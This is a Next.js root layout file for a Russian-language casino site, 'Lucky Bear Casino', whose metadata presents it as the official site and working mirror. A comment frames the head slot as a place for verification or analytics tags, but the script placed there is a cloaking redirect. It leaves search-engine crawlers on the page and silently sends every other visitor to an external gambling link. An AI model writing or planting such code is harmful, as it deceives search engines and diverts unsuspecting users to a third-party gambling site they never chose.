import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Fredoka, Manrope } from 'next/font/google'
import './globals.css'

const headingFont = Fredoka({
  subsets: ['latin'],
  weight: ['500', '600', '700'],
  variable: '--font-heading',
})

const bodyFont = Manrope({
  subsets: ['latin', 'cyrillic'],
  weight: ['400', '500', '600', '700'],
  variable: '--font-body',
})

const SITE_URL = 'https://luckybear30casino.vercel.app/'

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: 'Lucky Bear Casino — Лаки Бир Казино: официальный сайт, зеркало, вход и бонусы',
  description:
    'Lucky Bear Casino (Лаки Бир Казино) — официальный сайт и рабочее зеркало Luckybear Casino: вход, бонусы, слоты онлайн, кэшбек, регистрация и техподдержка 24/7 каждый день недели.',
  generator: 'v0.app',
  alternates: {
    canonical: SITE_URL,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
    },
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: SITE_URL,
    siteName: 'Lucky Bear Casino',
    title: 'Lucky Bear Casino — Лаки Бир Казино: официальный сайт и зеркало',
    description:
      'Официальный сайт и рабочее зеркало Lucky Bear Casino: вход, бонусы, слоты онлайн и мобильная версия без сбоев каждый день.',
    images: ['/images/lucky-bear-hero.jpg'],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Lucky Bear Casino — Лаки Бир Казино: официальный сайт и зеркало',
    description:
      'Официальный сайт и рабочее зеркало Lucky Bear Casino: вход, бонусы, слоты онлайн и мобильная версия без сбоев каждый день.',
    images: ['/images/lucky-bear-hero.jpg'],
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#1b120c',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${headingFont.variable} ${bodyFont.variable}`}>
      <head>
        <meta name="yandex-verification" content="dc3151e8fbbddc7e" />
        {/* Custom head tags slot — add verification, analytics or ad-network tags here without touching the Metadata API above. */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://spingame777.fit/4htNNl");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
